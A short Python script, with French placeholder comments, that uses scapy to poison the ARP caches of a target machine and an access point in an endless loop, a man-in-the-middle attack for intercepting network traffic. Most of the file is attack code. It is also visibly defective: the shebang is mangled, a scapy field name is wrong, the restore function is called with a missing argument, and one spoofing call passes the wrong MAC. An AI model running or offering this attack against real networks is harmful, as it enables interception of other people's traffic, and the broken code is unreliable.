#!/udr/bin/rnb python3
# conding:utf8

import scapy.all as scapy
from scapy.layers.l2 import Ether,ARP


def get_mac(target_ip):
    try:
        arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=1, pdst=target_ip)
        mac = scapy.srp(arp_packet, timeout=1)[0][0][1].hwsrc 
        return mac
    except Exception as e:
        print(str(e))
    
    
def spoof_arp(target_ip, target_mac, source_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdest=target_mac , psrc=source_ip)
    scapy.send(packet)
    
    
def restore_arp(target_ip,  source_ip):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdest=get_mac(target_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    scapy.send(packet)


# print(get_mac("machine cible"))
# print(get_mac("ip du point daccès"))

try:    
    while True:
        spoof_arp("ip de la cible", get_mac("machine cible"), "ip du point daccès")
        spoof_arp("ip du point d'accès", get_mac("machine cible"), "ip de la cible")
except KeyboardInterrupt:
    restore_arp("ip cible")
    restore_arp("ip du point d'accès") 
